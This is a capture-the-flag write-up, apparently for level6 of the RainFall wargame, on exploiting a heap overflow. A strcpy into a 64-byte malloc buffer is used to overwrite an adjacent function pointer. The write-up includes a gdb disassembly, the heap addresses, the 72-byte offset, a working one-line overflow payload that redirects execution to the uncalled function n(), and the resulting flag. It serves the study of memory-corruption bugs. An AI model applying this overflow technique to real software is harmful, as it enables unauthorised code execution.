in this binary we have 2 calls to `malloc`, one for a buffer we take as an argument and the other that stores `m` function address. there is another function that is not called (`n()`) and since we are using strcpy to copy our argument to our allocated space we can write more than we allocated.

if we inspect our program in gdb we can get the return address of both malloc allocations

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
(gdb) break *0x08048485
Breakpoint 1 at 0x8048485
(gdb) r s
Starting program: /home/user/level6/level6 s

Breakpoint 1, 0x08048485 in main ()
(gdb) ni
0x0804848c in main ()
(gdb) ni
0x08048491 in main ()
(gdb) x $eax
0x804a008:	0x00000000
(gdb) ni
0x08048495 in main ()
(gdb) ni
0x0804849c in main ()
(gdb) ni
0x080484a1 in main ()
(gdb) x $eax
0x804a050:	0x00000000
(gdb) 
```

now that we have both addresses `0x804a008` and `0x804a050` we calculate the offset between them which is `72`, so now we have the number of bytes we have to write to reach function address we want to overwrite.

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 64 + "B" * 8 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
and there you go.